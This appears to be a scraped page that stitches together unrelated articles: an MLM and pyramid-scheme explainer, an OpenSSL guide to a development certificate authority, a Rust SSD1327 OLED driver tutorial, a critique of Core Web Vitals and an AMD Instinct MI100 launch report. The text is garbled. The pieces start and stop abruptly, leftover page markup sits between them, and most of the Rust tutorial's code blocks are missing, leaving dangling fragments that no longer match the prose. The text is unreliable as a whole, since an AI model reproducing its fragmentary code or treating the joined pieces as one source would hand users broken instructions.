<p><span>While this makes it possible to earn money only from the commissions from your own product sales, making a significant amount of money would require selling massive amounts of products, and most people just don’t have customer networks that can support that. And so, in some of these companies, the only way to make significant amounts of money is to recruit many, many people and collect commissions on their sales, too.</span></p>
<p><span>Even though MLMs aren’t illegal, the FTC </span><a href="https://www.consumer.ftc.gov/articles/0065-multi-level-marketing-businesses-and-pyramid-schemes"><span>warns on its website</span></a><span> that </span><b>most of the people who join them make very little money</b><span>, and some even lose money. MLMs are structured so that only a small number of people who join the organization early on can typically recruit enough participants to reach high levels of income and rewards.</span></p>
<p><span>Here’s </span><a href="https://www.reddit.com/r/theydidthemath/comments/5bpek0/within_15_cycles_you_run_out_of_people_the_math/"><span>where a Reddit user did the math</span></a><span>: Because of the way MLMs are structured, there simply aren’t enough people on earth to support enough recruitment for people outside of the top 2 or 3 levels to reach the highest status, income, and rewards offered by MLM companies. As that Reddit user’s spreadsheet shows, if each member recruited only five new members, within 15 cycles, they’d surpass the entire population of the globe.&nbsp;</span></p>

If you’re lucky enough to be one of the first few sellers/recruiters to join an MLM, you might amass enough of a downline to earn a good living. Any later than that, and it may be actually impossible for you to recruit enough to make a significant income.</span></p>
<h3><span>Are MLMs Illegal?</span></h3>
<p><span>According to the FTC, truly legitimate MLMs are not scams or pyramid schemes, and are not illegal.</span></p>
<p><span>However, the FTC has </span><a href="https://www.ftc.gov/news-events/blogs/business-blog/2019/11/ftc-alleges-neora-formerly-known-nerium-operates-illegal"><span>filed numerous lawsuits</span></a><span>, including several </span><a href="https://www.ftc.gov/news-events/blogs/business-blog/2019/10/ftc-settlement-ends-advocares-alleged-pyramid-scheme-bans"><span>in the last few years</span></a><span>, against MLM companies that it says crossed the line and operated as pyramid schemes.&nbsp;</span></p>
<p><span>This highlights an important lesson for anyone considering joining an MLM: </span><b>Just because an MLM company has been operating for a long time or seems legitimate, doesn’t mean it’s not a pyramid scheme</b><span>. It’s important to carefully research these companies before joining them, and to temper any expectations you might have about quick success or extravagant earnings.</span></p>
<p><span>That isn’t to say that MLMs are bad for </span><i><span>all</span></i><span> people. Some early joiners do make a lot of money. And some people join just to buy products they love at a discount, or to sell small amounts of product for a side income. MLMs should be approached with caution, and before joining one, you have to be OK with the possibility that you could lose money, or make very little.</span></p>
<h2><span>Have You Fallen Victim to a Pyramid Scheme or a Scammy MLM?</span></h2>
<p><span>If you encounter a pyramid scheme, you should </span><a href="https://www.ftc.gov/policy/reports"><span>report it to the FTC</span></a><span> right away. And if you encounter an MLM that’s using shady sales tactics or misleading its members, you should report that, too.</span></p>
<p><span>But what about you? If you’ve lost money, or you’re looking for justice after a bad experience with these kinds of schemes, what legal options do you have?</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">







<div id="pagebody">

<div id="content" role="main">
<p>There are many blogs and tutorials with nice shortcuts providing the necessary
<code>openssl</code> commands to create and sign x509 certficates.</p>

<p>However, there is precious few instructions for how to easily create your own
certificate authority.</p>

<p>You probably never want to do this in a production environment, but in a
development environment it will make your life signficantly easier.</p>

<h2>Create the certificate authority</h2>

<h3>Create the key and certificate</h3>

<p>Pick a directory to store things in. Then, make your certificate authority key and certificate:</p>

<pre><code>openssl genrsa -out cakey.pem 2048
openssl req -x509 -new -nodes -key cakey.pem -sha256 -days 1024 -out cacert.pem
</code></pre>

<p>Some tips:</p>

<ul>
<li>You will be prompted to enter some information about your certificate
authoirty. Provide the minimum information - i.e., only overwrite the
defaults. So, provide a value for <code>Country</code>, <code>State or Province</code>, and
<code>Organization Name</code> and leave the rest blank.</li>
<li>You probably want to leave the password blank if this is a
development/testing environment.</li>
</ul>


<p>Want to review what you created?</p>

<pre><code>openssl x509 -text -noout -in cacert.pem 
</code></pre>

<h3>Prepare your directory</h3>

<p>You can create your own <code>/etc/ssl/openssl.cnf</code> file and really customize things. But I
find it safer to use your distribution's default file so you can benefit from
changes to it every time you upgrade.</p>

<p>If you <em>do</em> take the default file, you may have the <code>dir</code> option coded to
<code>demoCA</code> (in Debian at least, maybe it's the upstream default too).</p>

<p>So, to avoid changing any configuration files, let's just use this value. Which
means... you'll need to create that directory. The setting is relative - so you
can create this directory in the same directory you have your keys.</p>

<pre><code>mkdir demoCA
</code></pre>

<p>Lastly, you have to have a file that keeps track of your certificates. If it
doesn't exist, you get an error:</p>

<pre><code>touch demoCA/index.txt
</code></pre>

<p>That's it! Your certificate authority is ready to go.</p>

<h2>Create a key and ceritificate signing request</h2>

<p>First, pick your domain names (aka "common" names). For example, <code>example.org</code>
and <code>www.example.org</code>.</p>

<p>Set those values in an environment variable. If you just have one:</p>

<pre><code>export subjectAltName=DNS:example.org
</code></pre>

<p>If you have more then one:</p>

<pre><code>export subjectAltName=DNS:example.org,DNS:www.example.org
</code></pre>

<p>Next, create a key and a certificate signing request:</p>

<pre><code>openssl req -new -nodes -out new.csr -keyout new.key
</code></pre>

<p>Again, you will be prompted for some values (country, state, etc) - be sure to
choose the same values you used with your certficiate authority! I honestly
don't understand why this is necessary (when I set different values I get an
error on the signing request step below). Maybe someone can add a comment to
this post explaining why these values have to match?</p>

<p>Also, you must provide a common name for your certificate - you can choose the
same name as the altSubjectNames value you set above (but just one domain).</p>

<p>Want to review what you created?</p>

<pre><code>openssl req -in new.csr -text -noout 
</code></pre>

<h2>Sign it!</h2>

<p>At last the momenet we have been waiting for.</p>

<pre><code>openssl ca -keyfile cakey.pem -cert cacert.pem -out new.crt -outdir . -rand_serial -infiles new.csr
</code></pre>

<p>Now yu have a new.crt and new.csr that you can install via your web browser,
mail server, etc specification.</p>

<h2>Sanity check it</h2>

<p>This command will confirm that the certificate is trusted by your certificate
authority.</p>

<pre><code>openssl verify -no-CApath -CAfile cacert.pem new.crt 
</code></pre>

<h2>But wait, there's still a question of trust</h2>

<p>You probably want to tell your computer or browser that you want to trust your
certificate signing authority.</p>

<h3>Command line tools</h3>

<p>Most tools in linux by default will trust all the certificates in
<code>/etc/ssl/certs/ca-certificates.crt</code>. (If that file doesn't exist, try
installing the <code>ca-certificates</code> package). If you want to add your certificate
to that file:</p>

<pre><code>cp cacert.pem /usr/local/share/ca-certificates/cacert.crt
sudo dpkg-reconfigure ca-certificates
</code></pre>

<p>Want to know what's funny? Ok, not really funny. If the certificate name ends
with <code>.pem</code> the command above won't work. Seriously.</p>

<p>Once your certificate is installed with your web server you can now test to
make sure it's all working with:</p>

<pre><code>gnutls-cli --print-cert $domainName
</code></pre>

<p>Want a second opinion?</p>

<pre><code>curl https://$domainName
wget https://$domainName -O-
</code></pre>

<p>Both will report errors if the certificate can't be verified by a system
certificate.</p>

<p>If you really want to narrow down the cause of error (maybe reconfiguring
ca-certificates didn't work)?</p>

<pre><code>curl --cacert /path/to/your/cacert.pem --capath /tmp
</code></pre>

<p>Those arguments tell curl to use your certificate authority file and not to
load any other certificate authority files (well, unless you have some
installed in the temp directory).</p>

<h3>Web browsers</h3>

<p>Firefox and Chrome have their own store of trusted certificates - you'll have
to import your cacert.pem file into each browser that you want to trust your
key.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>A year or so ago when I started my yourney into embedded development (to build a PID controller for my coffee machine) I bought a <a href="https://www.waveshare.com/wiki/1.5inch_RGB_OLED_Module">1.5 inch RGB OLED display</a>, which uses a SSD1351 controller. I got lucky, because a display driver for it <a href="https://crates.io/crates/ssd1351">already existed</a>.</p>
<p>Unfortunately, very recently it stopped working and I’m not sure why. Okay, maybe I tightened those screws a bit too much. Anyways, since I did not need a color display, I bought a very similar <a href="https://www.waveshare.com/wiki/1.5inch_OLED_Module">1.5 inch OLED display</a>. After plugging it in and not seeing anything rendered on the screen (and not touching my screwdriver), I realized that it uses a different controller: the SSD1327. This time I wasn’t as lucky, because there happened to be no embedded rust driver out there yet.</p>
<p>When life gives you lemons, write a display driver for them - and then blog about it so everyone gets to learn maybe a thing or two.</p>
<p><img src="https://nitschinger.at/img/display-clean.jpg" alt="Display with Text"></p>
<p>The basic driver we are going to implement in this post works, but is neither flexible nor configurable. The full driver (which is still evolving) is goint to be a bit more complex and can be found <a href="https://github.com/daschl/ssd1327">here</a>.</p>

<p>Before we dive in, we first need to figure out how to talk to the display and what protocol to use. The <a href="https://www.waveshare.com/w/upload/a/ac/SSD1327-datasheet.pdf">Datasheet</a> is very handy and I recommend to keep it open in a separate tab while working on the code.</p>
<p>The controller supports different modes of communication: 4-wire SPI, 3-wire SPI, I2C, Parallel 6800 and Parallel 8080. In this blog post we’ll use 4-wire SPI which is the one the display comes preconfigured with. The bytes we send over SPI can either be commands (for example to turn the display on or off) or actual pixel data to render on the screen. The datasheet thankfully has all that info, but it can be a little tough to digest at first if you need to start from zero.</p>
<p>Thankfully, we don’t need to start from zero. There are two very useful codebases out there which will help us hit the ground running:</p>
<ul>
<li>Download the demo code from the <a href="https://www.waveshare.com/wiki/1.5inch_OLED_Module">Waveshare Website</a>, which contains C code we can look at, which is very helpful especially to understand what commands we need to send during startup.</li>
<li>A controller driver for the very similar <a href="https://github.com/jamwaffles/ssd1306">ssd1306</a> exists, and it is very well written. We can borrow some concepts like the command structure.</li>
</ul>

<p>We could directly talk to our hardware SPI interface, but that is not going to be very portable. Ideally we want to plug this display driver into the established embedded rust ecosystem and benefit from code reuse and portability. For our purpose, three crates are important:</p>
<ul>
<li><a href="https://github.com/therealprof/display-interface">display-interface</a>: traits that bridge between a bus driver (i.e. SPI) and a display driver (our ssd1327). By using this crate, we also open the door to support I2C later.</li>
<li><a href="https://github.com/embedded-graphics/embedded-graphics">embedded-graphics</a>: once we can talk to the device, we also need to render pixels. This crate will make it super easy to render text, lines and more.</li>
<li><a href="https://github.com/rust-embedded/embedded-hal">embedded-hal</a>: this is the main hardware abstraction layer crate and we’ll use it to talk to specific hardware pins and use time delay functionality.</li>
</ul>
<p>We are going to make use of all three in the next sections.</p>

<p>Before we can render pixels on the screen, we need to initialize our display. The datasheet contains <em>a lot</em> of different commands, many of them are hardware oriented and it is pretty hard to figure out what we need. Thankfully, if we peek into the waveshare sample code, we can see a function like this:</p>
<div><div>

  <span>//Set the display scan and color transfer modes

  Driver_Delay_ms(<span>200</span>);

  <span>//Turn on the OLED display
</span><span></span>  OLED_WriteReg(<span>0xAF</span>);
}
</code></pre></td></tr></tbody></table>
</div>
</div><p>This gives us a first idea: we need to reset the display, then initialize it, sleep and then write <code>0xAF</code>. Searching for <code>AF</code> in the datasheet tells us that this command will turn the display on. Alright, let’s start with reset:</p>

  OLED_RST_1;
  Driver_Delay_ms(<span>100</span>);
}
</code></pre></td></tr></tbody></table>
</div>
</div><p>The code sets the RST (“reset”) pin from our display to high, then low and then high again, sleeping 100ms in between. So how would we translate that to rust?</p>

</code></pre></td></tr></tbody></table>
</div>
</div><p>The <code>embedded-hal</code> crate defines two important traits: one for an <code>OutputPin</code> and one to <code>Delay</code> for a certain number of milliseconds. The actual implementation comes from your board HAL (hardware abstraction layer), one of which we’ll see later. Also note that error handling is omitted here to simplify the code for this blog post.</p>
<p>Next up, we need to initialize the display. The C code is not very well documented, but we can see that a sequence of commands is sent to the display:</p>

  OLED_WriteReg(<span>0xfd</span>);
  OLED_WriteReg(<span>0x12</span>);

}
</code></pre></td></tr></tbody></table>
</div>
</div><p>For our rust code we want to turn those commands into an actual <code>enum</code> so it is easier to understand. We also need to implement the equivalent of <code>OLED_WriteReg</code>, which will send those commands to the display. This is where the <code>display-interface</code> crate comes in. The <code>WriteOnlyDataCommand</code> trait it defines abstracts the actual low level communication for us and we just need to call the implementation of the trait.</p>
<p>The idea of the following code is shamelessly taken from the excellent <code>ssd1306</code> crate. Every command gets its own enum variant and we can <code>send</code> it to our display:</p>

    }
}
</code></pre></td></tr></tbody></table>
</div>
</div><p>For the actual driver we need more commands, but the approach is always the same. On <code>send</code> we match on the enum variant and turn it into a byte slice which is then sent over the connection through the <code>WriteOnlyDataCommand</code> trait.</p>
<p><em>If you wonder why it specifies the length and data in such a weird way (as I did): if you try to return the array in the match arms rust will complain that the match arms have different array sizes. So the workaround by <a href="https://github.com/jamwaffles">jamwaffles</a> is to always return a byte array with the same length, but then pass a slice of the correct size to the display. This makes the compiler happy and keeps the implementation short.</em></p>
<p>Before we can glue it all together, we need to figure out how we can send the pixel information to the display.</p>

<p>Our display has 128 rows and 128 colums with a potential of 16 colors each. 16 colors are represented by 4 bits, which is why the internal graphic display data RAM (GDDRAM) contains a buffer of <code>128 * 128 * 4 = 65536</code> bits. This allows to store all information for our 16384 pixels. Since rust does not have a <code>u4</code> datatype, we’ll use a single byte <code>u8</code> representation instead. This allows us to store the information of two pixels in one byte, so we need a buffer size of <code>65536 / 8 = 8192</code> bytes.</p>
<p>This is where <code>embedded-graphics</code> comes in. It defines a <code>DrawTarget</code> trait which we need to implement for our display. All we need to tell it is how to draw a pixel and what our display size is, and it will figure out the rest for us (i.e. drawing text or a shape):</p>

</div><p>The first thing to note is <code>Gray4</code> on the <code>DrawTarget</code>. Since this trait supports all kinds of displays, we need to tell it which pixel colors we support. <code>Gray4</code> indicates 4 bit grayscale, so exactly what we need. This is also highlights how we utilize rust’s type system to our benefit. We will only accept pixel colors that our device actually supports, any attempts to pass in i.e. a red color will fail at compile time.</p>
<p>In the <code>draw_pixel</code> method, we extract the <code>x</code> and <code>y</code> coordinates of the pixel as well as its color through the <code>luma()</code> method. We first need to calculate the actual absolute position in our buffer based on the coordinates and then set the color on the element. Since we store 2 colors per byte the code needs to perform some bitshifting and either set the high or low 4 bits of the byte. This code has been taken from the waveshare C code and ported over to rust.</p>

  <div>
    <p>Earlier this week, <a href="https://webmasters.googleblog.com/2020/11/timing-for-page-experience.html">Google announced</a> that they will officially start using a subset of web performance metrics known as Core Web Vitals as part of their search ranking calculations starting in May 2021. This is huge, positive news in the perf &amp; SEO worlds. Google's inclusion of Core Web Vitals will act as a much-needed forcing function to encourage sites to improve their performance.</p>
<p>However, my excitement for Core Web Vitals is tempered with a healthy skepticism. I'm not yet convinced that Largest Contentful Paint (LCP), First Input Delay (FID), and Cumulative Layout Shift (CLS) are the right metrics that all sites should be measuring themselves against. I worry that the outsized emphasis placed on Core Web Vitals by including them in SEO scoring will result in developers focusing solely on those three numbers without truly understanding what they mean and, more importantly, what they <em>don't</em> mean.</p>
<h2 id="a-brief-history-of-web-perf-metrics">A brief history of web perf metrics <a href="#a-brief-history-of-web-perf-metrics">#</a></h2>
<p>In order to understand the importance of Core Web Vitals, it's helpful to understand the historical context of web performance metrics and how we got to this point. For many years, the only way that we were able to track and measure performance on the web was via a set of network- and browser internals-based metrics known collectively as <a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigation_timing_API">Navigation Timing</a>. The Navigation Timing spec is widely supported across browsers (even going back to IE9!). These metrics answer questions like:</p>
<ul>
<li>When does the server respond to a request with the first byte of HTML (time to first byte/TTFB)?</li>
<li>When does the browser finish loading and parsing the DOM (DOM content loaded/DCL)?</li>
<li>When have all the assets included on the page finished downloading (page load)?</li>
<li>And many others...</li>
</ul>
<p>For years, Navigation Timing was the standard that folks used to measure their performance, but over time it became clear that there were significant issues with this approach. Firstly, navigation-centered metrics are highly variable based on your tech choices - the size of your assets combined with where, when, and how you include them in your markup can dramatically change the navigation timing values of your page. If your site (like many) switches from a fully server-rendered page to a client-rendered SPA, you'll see vastly different values reported for navigation metrics, but that doesn't necessarily mean that your site's performance got better or worse.</p>
<p>This is because Navigation Timing metrics measure milestones which are meaningful to a <em>web browser</em>, but often completely invisible to a <em>user</em>. If you ask a human being how fast a page loaded on their phone, they aren't going to respond with "when the DOM was fully constructed" or "when all the site's assets were downloaded and parsed". They'll answer based on when the content appears on screen, when the main image or header text was fully rendered, or when they were able to click/tap/scroll to interact with the page.</p>
<p>To bring us closer to a world where we can measure performance in a way that matters to the people that use the web, the industry has more recently shifted away from navigation timings towards new, <em>user-centered</em> metrics that better reflect the experience of users.</p>
<h2 id="enter-core-web-vitals">Enter Core Web Vitals <a href="#enter-core-web-vitals">#</a></h2>
<p>Google's answer to the question of what metrics best represent the experience of users are three metrics that they are calling <a href="https://web.dev/vitals/">Core Web Vitals</a>:<br>
<em>Largest Contentful Paint (LCP)</em>, which measures  the amount of time (in ms) that it takes for the largest (and probably most important) thing on the page to render,<br>
<em>First Input Delay (FID)</em>, which measures the amount of time (in ms) that it takes for a page to respond to user input such as tapping/clicking/scrolling/etc,<br>
<em>Cumulative Layout Shift (CLS)</em>, which is a fraction representing how much the layout of the page changes during load (e.g. that annoying thing where you go to tap a link but the page has shifted the location of the link out from under you).</p>
<p>Now, don't get me wrong, I am pro-Core Web Vitals! These metrics, what they measure, and the fact that Google is holding sites accountable for their performance is a huge step forward for the web. Developers who have struggled to get buy-in from leadership now have a rock-solid business case for investing in performance improvements. The folks at Google who worked on Core Web Vitals are lovely people who have the best of intentions and truly believe in the importance of performance to move the web forward.</p>
<p>I'm just not quite ready to jump on the Core Web Vitals hype train. Google has chosen to include metrics in Core Web Vitals that meet <em>Google's</em> needs, and I'm not convinced that Google's goals and our goals as web performance practitioners are exactly the same thing.</p>
<h2 id="vital-for-whom%3F">Vital for whom? <a href="#vital-for-whom%3F">#</a></h2>
<p>The Core Web Vital metrics - LCP, FID, and CLS - measure common <em>annoyances</em> that would cause a user to get frustrated and bounce early after clicking a link, especially on their first visit to a site or page. And, because these metrics are all tech-stack agnostic, they can be used to compare sites against each other, unlike traditional Navigation Timing metrics. It doesn't matter if you serve static HTML with no javascript, or a framework-powered SPA that renders completely on the client, or any of myriad possible frontend technology choices in between - Core Web Vitals measurements are comparable across every site on the internet.</p>
<p>So, from a business perspective, the metrics that were included in Core Web Vitals make total sense <em>for Google</em>. Their search business is predicated on returning a list of relevant links - links that users click on and stay at (one could argue that because of advertising revenue Google would want people to constantly go back to the results list, but if users don't find Google's results relevant, then they won't keep using the service). And, Google needs to be able to compare millions of sites with different tech stacks against each other in order to provide the best, least bounce-inducing results.</p>
<p>For the rest of us, however, I don't think LCP, FID, and CLS <em>alone</em> give us a complete picture of our sites' performance. There are significant gaps in what Core Web Vitals measure, so I think it's important to temper our enthusiasm with a frank discussion of the shortcomings of these metrics.</p>
<h2 id="the-browser-problem">The browser problem <a href="#the-browser-problem">#</a></h2>
<p>One of the main problems I see with Core Web Vitals is the lack of cross-browser support. Two of the three (LCP and CLS) are currently only available in Chrome and other Chromium-based browsers. The third, FID, is supported natively in Chrome via the <a href="https://developer.mozilla.org/en-US/docs/Web/API/PerformanceEventTiming">PerformanceEventTiming API</a>, or is <a href="https://github.com/GoogleChromeLabs/first-input-delay">available via a polyfill</a> that site owners need to individually add to their markup in order to track FID on their own.</p>
<p>This is unfortunately a pervasive and frustrating issue in the performance community - many important and useful new metrics are only supported in Chrome. I’m happy that folks at Google are working hard to push the state of performance monitoring forward with these awesome and useful new metrics, but if we focus on them alone (Vitals or otherwise), we exclude a significant portion of traffic from our performance monitoring.</p>
<p>There's a tendency to dismiss this concern because "all modern browsers are pretty much the same, so Chrome is representative of all of our traffic", but that is far from the reality I've seen from analyzing millions of data points that show pretty clear differences between browser performance. Modern browsers may support similar features, but under the hood, they handle loading, rendering, and javascript execution in different ways, and it feels short-sighted and injudicious to simply ignore the experiences of huge swaths of users simply because we can’t use these new metrics to do so.</p>
<p>The solution to this problem, of course, is that other browser vendors need to start providing these super important metrics to developers! Until that beautiful day comes, I don't think we should dismiss other non-Vitals timings wholesale, or stop searching for creative cross-browser ways to measure real user performance. At Etsy, for example, we implemented a custom user timing that logs when our SVG logo renders. This measures approximately the same value as FCP (within a 50ms standard deviation), and is available in all browsers, even back to IE10!</p>
<h2 id="the-business-outcome-problem">The business outcome problem <a href="#the-business-outcome-problem">#</a></h2>
<p>Another issue with the metrics selected for Core Web Vitals is that it's been hard to correlate changes in FID and CLS with business outcomes, and even harder to do causal analysis when we see regressions. Note that we don't yet have enough historical LCP data to know how useful it will be, but based on FCP analysis I am expecting LCP to be highly correlated with business outcomes, unlike the other two Core Web Vitals.</p>
<p>FID, in particular, has proven to be a highly subjective measurement that isn't always useful when viewed in isolation. FID is ostensibly supposed to be measuring the effect of thread-blocking Javascript execution, but our FID RUM values are most often logged when a user clicks on a navigation link that takes them to another page.</p>
<p>FID data is also difficult to analyze, because in reality it can change either because you are blocking the thread for a longer period, or because you changed the user interface in a way that changes user behavior. Disentangling experimental results that have an ambiguous cause is frustrating to say the least.</p>
<p>To give an example of how FID is an unreliable tool for measuring user outcomes: Let's say we load images in a row of search results faster. This causes users to click on search results earlier than before, but now this interaction happens while Javascript fired at DCL is still executing, so FID increases. Should we undo that change and go back to loading the images slower? If we <em>only</em> looked at Core Web Vitals, then the answer would be "CLS and LCP stayed the same, but FID degraded, so we should probably undo the change". However the real, nuanced answer is more like "Long tasks didn't increase alongside FID, so it seems like we changed user …</p></div></article></div>

            <!-- content --><p>Today we have the answer to the NVIDIA A100 GPU from its chief (current) competitor, the AMD Instinct MI100. While the NVIDIA A100 GPU is getting a bump from 40GB to 80GB today, AMD is touting a new architecture specifically to deliver a lot of HPC flops at a low cost. Let us get into the new CDNA offering. <strong>Update</strong>: AMD let us know there is no “Radeon” in the product name since it is CDNA so we are updating the article to reflect that.<span id="more-48498"></span></p>
<h2>AMD Instinct MI100 Background</h2>
<p>Keeping the background brief, the AMD Instinct MI100 is an architecture designed differently. AMD realized that traditional GPUs, insofar as they are “graphics” processing, are inefficient by including the logic that helps quickly render games. As a result, AMD split their GPU efforts into RDNA for the gaming community, as we covered in the recent <a href="https://www.servethehome.com/amd-radeon-rx-6900-xt-6800-xt-6800-rdna-2/">AMD Radeon RX 6900 XT 6800 XT and 6800 Launch</a>. For the data center, we have CDNA.</p>

<p>In all of these background slides, there are not so subtle jabs at NVIDIA. For example, above, we have “General Purpose” which is effectively NVIDIA’s Ampere design. Below, AMD is pointing out that it has public DoE exascale wins. Intel does as well (although perhaps HPE-Cray was the big winner here) and NVIDIA did not win in that first round of exascale contracts.</p>

<p>NVIDIA is doing more than high-performance computing for supercomputers with its chips, instead of focusing on AI acceleration with features such as supporting sparsity. As a result, the raw FP64 performance gains are not as large enough to meet exascale needs per AMD.</p>

<p>Intel for its part is saying the same thing, but AMD has its new product in the space today while Intel is releasing video transcoding <a href="https://www.servethehome.com/intel-server-gpu-shown-for-video-transcoding-applications/">server GPUs</a>.</p>
<h2>AMD Instinct MI100 Overview</h2>
<p>The AMD Instinct MI100 GPU is the company’s new offering in the HPC compute space for GPUs. We are going to discuss the “Peak Performance / $ Compared to A100” in a moment, but let us get to the main specs first.</p>

<p>We can see that we have a 11.5 TFLOP (peak) GPU that fits into a standard PCIe Gen4 x16 slot. Something that we wanted to mention is that Infinity Fabric Link. The Instinct MI100 is designed to run in four GPU “hives” as shown in this article’s cover image. AMD is using Infinity Fabric to provide more performance than PCIe Gen4 for GPU-to-GPU communication much like NVIDIA NVLink. We asked AMD about the 32GB HBM2 capacity given NVIDIA was already at 40GB before the 80GB is being simultaneously announced with the MI100. AMD said it was a sweet spot to control costs for HPC customers much like HPC customers often care more about filling memory channels than with hitting high memory capacity on CPUs.</p>

<p>A lot of the speedup comes from the new pipeline. Here is what the “Enhanced Compute Unit” looks like. We have some readers that will skip this, other that will want to see details. AMD has a new whitepaper out with more details but otherwise, feel free to read the chart if you want to understand more about what AMD is doing at a very low level.</p>

<p>The net impact is that the AMD Instinct MI100 is a single 300W PCIe card that is 11.5 TFLOPs peak. AMD did an obligatory comparison of its new 300W PCIe GPU to the 2000 #1 supercomputer using 6MW and occupying many racks. 2000 was a long time ago in computing terms and back when Intel Pentium was still a premium brand.</p>

<p>A bit part of what AMD is discussing is compute per dollar and performance per dollar. Having less memory onboard its new 7nm GPU helps with 32GB of HBM2 versus 40GB or 80GB from NVIDIA. At the same time, with the new NVIDIA A100 80GB, NVIDIA can push the 40GB model pricing down which will have a big impact on the chart below.</p>

<p>AMD is not just comparing to NVIDIA, it is also giving a comparison of its new chips versus its current-generation Instinct MI50. This table shows some of the massive performance gains which get close to 7x in the popular FP16 format.</p>

<p>Since we know AMD has won several Exascale computer contracts such as the <a href="https://www.servethehome.com/hpe-cray-and-amd-win-again-with-el-capitan-2-exaflop-supercomputer/">El Capitan 2 Exaflop Supercomputer</a>, we see ORNL as an early adopter discussing performance increases. We will note that AMD is comparing to the MI60 here not the MI50 as it did above. AMD is also comparing to the NVIDIA V100, not the current generation A100.</p>
<figure id="attachment_48511" aria-describedby="caption-attachment-48511"><a href="https://www.servethehome.com/amd-radeon-instinct-mi100-32gb-cdna-gpu-launched/amd-radeon-instinct-mi100-at-ornl/" rel="attachment wp-att-48511"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL.jpg" alt="AMD Radeon Instinct MI100 At ORNL" width="1338" height="717" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL.jpg 1338w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL-400x214.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL-800x429.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL-696x373.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL-1068x572.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-at-ORNL-784x420.jpg 784w" sizes="(max-width: 1338px) 100vw, 1338px"></a><figcaption id="caption-attachment-48511">AMD Instinct MI100 At ORNL</figcaption></figure>
<p>What we do know is that the buyers of these supercomputers are very smart individuals. Clearly what AMD showed them with the MI100 and future generations was good enough that NVIDIA did not win these contracts. Of course, AMD is looking to future generations of GPUs for its exascale plans, but it needs to get industry software running on its GPUs. For that, AMD has ROCm which is updated as well.</p>
<h2>AMD ROCm 4.0 Updates</h2>
<p>Part of the news is that AMD ROCm 4.0 is out. With each generation of ROCm, the company is covering more use cases and scenarios. The company has a big task where GPU compute was largely pioneered on CUDA and NVIDIA GPUs. ROCm allows AMD and its customers to easily port CUDA applications and other components to run on AMD GPUs.</p>
<figure id="attachment_48507" aria-describedby="caption-attachment-48507"><a href="https://www.servethehome.com/amd-radeon-instinct-mi100-32gb-cdna-gpu-launched/amd-rocm-4-0-scenario-coverage/" rel="attachment wp-att-48507"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage.jpg" alt="AMD ROCm 4.0 Scenario Coverage" width="1372" height="718" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage.jpg 1372w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage-400x209.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage-800x419.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage-696x364.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage-1068x559.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Scenario-Coverage-803x420.jpg 803w" sizes="(max-width: 1372px) 100vw, 1372px"></a><figcaption id="caption-attachment-48507">AMD ROCm 4.0 Scenario Coverage</figcaption></figure>
<p>Next year with ROCm 5.0 we will likely see a bit more about how ROCm 4.0 is incomplete but ROCm 5.0 has complete coverage. At least that is what we have been trained to expect over the past few generations. ROCm 4.0 is delivering larger performance gains which makes porting less painful for existing GPU compute users.</p>
<figure id="attachment_48508" aria-describedby="caption-attachment-48508"><a href="https://www.servethehome.com/amd-radeon-instinct-mi100-32gb-cdna-gpu-launched/amd-rocm-4-0-speedup/" rel="attachment wp-att-48508"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup.jpg" alt="AMD ROCm 4.0 Speedup" width="1356" height="715" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup.jpg 1356w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup-400x211.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup-800x422.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup-696x367.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup-1068x563.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-ROCm-4.0-Speedup-797x420.jpg 797w" sizes="(max-width: 1356px) 100vw, 1356px"></a><figcaption id="caption-attachment-48508">AMD ROCm 4.0 Speedup</figcaption></figure>
<p>This is an area where those exascale DoE contracts are helping. Part of the contracts were going beyond hardware but also for developing tooling around the next-gen systems. AMD is investing in ROCm to ensure the software can run on its flagship systems as they start arriving. Intel has been talking about the benefits of <a href="https://www.servethehome.com/great-2021-intel-xeon-sapphire-rapids-with-xe-ponte-vecchio-gpu-and-oneapi-at-sc19/">OneAPI</a>, but there is a good chance AMD will power the first exascale system.</p>
<h2>AMD Instinct MI100 Partners</h2>
<p>As mentioned earlier, AMD’s design centers around a 4x GPU to CPU ratio. Here AMD is showing four AMD Instinct MI100 GPUs per “hive” and one hive per AMD EPYC 7003 “Milan” CPU.</p>
